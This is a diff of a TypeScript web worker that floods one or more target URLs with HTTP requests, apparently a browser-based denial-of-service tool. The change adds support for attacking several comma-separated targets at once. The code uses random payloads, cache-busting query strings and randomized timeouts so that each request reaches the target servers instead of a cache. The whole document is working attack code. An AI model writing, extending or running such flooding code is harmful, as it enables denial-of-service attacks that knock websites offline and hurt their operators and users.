@@ -42,7 +42,11 @@ self.addEventListener(
   "message",
   async (e: MessageEvent<{ type: string; threads: number; url: string }>) => {
     if (e.data.type !== "init") return;
-    const target = `https:${e.data.url.replace(/http(s?):/, "")}`;
+    const targets = e.data.url
+      .split(",")
+      .map(
+        (target) => `https:${target.replace(/\s/, "").replace(/http(s?):/, "")}`
+      );
 
     let nRequests = 0n;
     let payload = generateRandomString(PAYLOAD_SIZE);
@@ -66,14 +70,15 @@ self.addEventListener(
       }
 
       const timeoutRand = Math.round(Math.random() * 100) - 50;
-      queue.push(
-        sendRequest(
-          `${target}?${payload.toString()}${Math.random()}`,
-          REQUEST_TIMEOUT_BASE + timeoutRand
-        )
-      );
-
-      nRequests++;
+      targets.forEach((target) => {
+        queue.push(
+          sendRequest(
+            `${target}?${payload.toString()}${Math.random()}`,
+            REQUEST_TIMEOUT_BASE + timeoutRand
+          )
+        );
+        nRequests++;
+      });
     }
   },
   false
